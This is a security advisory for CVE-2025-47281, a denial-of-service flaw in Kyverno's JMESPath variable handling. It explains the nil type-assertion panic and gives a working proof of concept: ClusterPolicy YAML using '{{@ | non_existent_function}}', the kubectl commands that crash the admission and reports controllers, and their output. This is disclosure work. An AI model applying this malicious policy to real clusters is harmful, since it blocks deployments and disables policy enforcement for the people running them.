# Kyverno's Improper JMESPath Variable Evaluation Lead to Denial of Service

**GHSA**: GHSA-r5p3-955p-5ggq | **CVE**: CVE-2025-47281 | **Severity**: high (CVSS 7.7)

**CWE**: CWE-20, CWE-248

**Affected Packages**:
- **github.com/kyverno/kyverno** (go): <= 1.14.1

## Description

### Summary
A Denial of Service (DoS) vulnerability exists in Kyverno due to improper handling of JMESPath variable substitutions. Attackers with permissions to create or update Kyverno policies can craft expressions using the `{{@}}` variable combined with a pipe and an invalid JMESPath function (e.g., `{{@ | non_existent_function }}`).

This leads to a `nil` value being substituted into the policy structure. Subsequent processing by internal functions, specifically `getValueAsStringMap`, which expect string values, results in a panic due to a type assertion failure (`interface {} is nil, not string`). This crashes Kyverno worker threads in the admission controller (and can lead to full admission controller unavailability in Enforce mode) and causes continuous crashes of the reports controller pod, leading to service degradation or unavailability."

### Details
The vulnerability lies in the `getValueAsStringMap` function within `pkg/engine/wildcards/wildcards.go` (specifically around line 138):

```go
func getValueAsStringMap(key string, data interface{}) (string, map[string]string) {
    // ...
    valMap, ok := val.(map[string]interface{}) // val can be the map containing the nil value
    // ...
    for k, v := range valMap { // If valMap contains a key whose value is nil...
        result[k] = v.(string) // PANIC: v.(string) on a nil interface{}
    }
    return patternKey, result
}
```

When a policy contains a variable like `{{@ | foo}}` (where `foo` is not a defined JMESPath function), the JMESPath evaluation within Kyverno's variable substitution logic results in a `nil` value. This `nil` is then assigned to the corresponding field in the policy pattern (e.g., a label value).

During policy processing, `ExpandInMetadata` calls `expandWildcardsInTag`, which in turn calls `getValueAsStringMap`. If the `data` argument to `getValueAsStringMap` (derived from the policy pattern) contains this `nil` value where a string is expected, the type assertion `v.(string)` panics when `v` is `nil`.

### Proof of Concept (PoC)

This proof of concept consists of two phases. First a malicious policy is inserted with the default validation failure action, which is `Audit`. In this phase the reports controller will end up in a crash loop. The admission controller will print out a similar stack trace, but only a worker crashes. The admission controller process does not crash.

In the second phase the same policy is inserted with the `Enforce` validation failure action. In this scenario both admission controller and the reports controller end up in a crash loop. As the admission controller crashes on incoming admission requests, it effectively makes it impossible to deploy new resources.

Tested on Kyverno v1.14.1.

1.  **Prerequisites**:
    Kubernetes cluster with Kyverno installed. Attacker has permissions to create/update `ClusterPolicy` or `Policy` resources.

2.  **Create a Malicious Policy**:
    Apply the following `ClusterPolicy`:

    ```yaml
    apiVersion: kyverno.io/v1
    kind: ClusterPolicy
    metadata:
        name: dos-via-jmespath-nil
    spec:
        rules:
        - name: trigger-nil-panic
          match:
            any:
            - resources:
                kinds:
                - Pod
          validate:
              message: "DoS attempt via JMESPath nil substitution"
              pattern:
                metadata:
                  labels:
                    # '{{@ | non_existent_function}}' will result in a nil value for this label.
                    # This nil value causes a panic in getValueAsStringMap.
                    trigger_panic: "{{@ | non_existent_function}}"
    ```

3.  **Verify the policy status**:
    Make sure the policy is ready.

    ```bash
    k get clusterpolicy dos-via-jmespath-nil
    NAME                   ADMISSION   BACKGROUND   READY   AGE   MESSAGE
    dos-via-jmespath-nil   true        true         True    24m   Ready
    ```

3.  **Trigger the Policy**:
    Create any Pod in any namespace (if not further restricted by `match` or `exclude`):

    ```bash
    kubectl run test-pod-dos --image=nginx
    ```

4.  **Observe Crashes**:
    *   Check Kyverno admission controller logs for worker panics (`interface conversion: interface {} is nil, not string`).
    *   Check Kyverno reports controller logs; the pod crashes and restarts.
    *   Stack trace available here (as a secret gist): https://gist.github.com/thevilledev/723392bad36020b82209262275434380

5. **Reset**:
   Delete the existing policy with `kubectl delete clusterpolicy dos-via-jmespath-nil` and delete
   the test pod with `kubectl delete pod test-pod-dos`. Then apply the following:

   ```yaml
    apiVersion: kyverno.io/v1
    kind: ClusterPolicy
    metadata:
        name: dos-via-jmespath-nil-enforce
    spec:
        validationFailureAction: Enforce # This has changed
        rules:
        - name: trigger-nil-panic
          match:
            any:
            - resources:
                kinds:
                - Pod
          validate:
              message: "DoS attempt via JMESPath nil substitution"
              pattern:
                metadata:
                  labels:
                    # '{{@ | non_existent_function}}' will result in a nil value for this label.
                    # This nil value causes a panic in getValueAsStringMap.
                    trigger_panic: "{{@ | non_existent_function}}"
   ```

6.  **Trigger the Policy (again)**:
    Create any Pod in any namespace (if not further restricted by `match` or `exclude`):

    ```bash
    kubectl run test-pod-dos --image=nginx
    ```

    The command returns the following error:

    ```bash
    Error from server (InternalError): Internal error occurred: failed calling webhook "validate.kyverno.svc-fail": failed to call webhook: Post "https://kyverno-svc.kyverno.svc:443/validate/fail?timeout=10s": EOF
    ```

7.  **Observe Crashes**:
    *   Check Kyverno admission controller logs for container panic. Notice that the whole controller has crashed, not just a worker.
    *   Check Kyverno reports controller logs; the pod crashes and restarts.

### Impact

This is a Denial of Service (DoS) vulnerability.

*   **Affected Components**:
    *   **Kyverno Admission Controller**: In Audit mode, individual worker threads handling admission requests will panic and terminate. While the main pod uses a worker pool and can recover by spawning new workers, repeated exploitation can degrade performance or lead to worker pool exhaustion. In Enforce mode, the whole controller panics. This makes all related admission requests fail.
    *   **Kyverno Reports Controller**: The entire controller pod will panic and crash, requiring a restart by Kubernetes. This halts background policy scanning and report generation.

*   **Conditions**: An attacker needs permissions to create or update Kyverno `Policy` or `ClusterPolicy` resources. This is often a privileged operation but may be delegated in some environments.
*   **Consequences**: Degraded policy enforcement, inability to create/update resources, and loss of policy reporting visibility. 

### Mitigation

- Add robust `nil` handling in `getValueAsStringMap`.
- Look into adding graceful error handling in JMESPath substitution. Prevent evaluation errors (like undefined functions) from resulting in `nil` values.
